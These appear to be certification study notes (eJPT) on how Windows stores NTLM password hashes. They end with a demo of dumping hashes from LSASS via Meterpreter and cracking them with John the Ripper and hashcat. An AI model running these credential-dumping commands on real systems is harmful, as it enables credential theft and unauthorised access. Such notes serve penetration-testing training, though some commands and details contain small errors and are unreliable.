# 57 Dumping & Cracking Windows Hashes

## Windows Password Hashes

- The Windows OS stores hashed user account password locally in the SAM (Security Accounts Manager) database.
- Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.
- Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).
- Windows versions up to Windows Server 2003 utilize two different types of hashes:
	- LM
	- NTLM
- Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.


## SAM Database

- SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.
- The SAM database file cannot be copied while the operating system is running.
- The Windows NT kernel keeps the SAM database file locked and as s result attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
- In modern versions of Windows, the SAM database is encrypted with a syskey.

Note: Elevated/Administrative privileges are required in order to access and interact with the LSASS process.


## NTLM (NTHash)

- NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.
- From Windows Vista onwards, Windows disables lM hashing and utilizes NTLM hashing.
- When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.
- NTLM improves upon LM in the following ways:
	- Does not split the hash in to two chucks.
	- Case sensitive.
	- Allows the use of symbols and unicode characters. 

```
					!Passw0rd123! ----> MD4 ----> HASH (NTLM Hash)
```


## Dumping & Cracking NTLM Hashes

- We can dump Windows password hashes by leveraging various utilities like:
	- The inbuilt meterpreter `hashdump` command
	- Mimikatz
- After we have dumped the hashes, we can crack them through the use of the following utilities:
	- John The Ripper
	- Hashcat


### DEMO

```shell
meterpreter: pgrep lsass # Migrate to lsass process
meterpreter: migrate <pid>
meterpreter: hashdump

# Save hash locally
nano hashes.txt

# Use John the Ripper
john --list=formats # List all formats john can crack
john --format=NT hashes.txt # Crack with default wordlist
john --format=NT hashes.txt --wordlist=<wordlist> # Add a wordlist

# Use hashcat
hashcat -a 3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
# -a attack type
# -m hash type

# Unzip rockyou
gzip -d /usr/share/wordlist/rockyou.txt.gz
```


#cybersecurity #eJPT 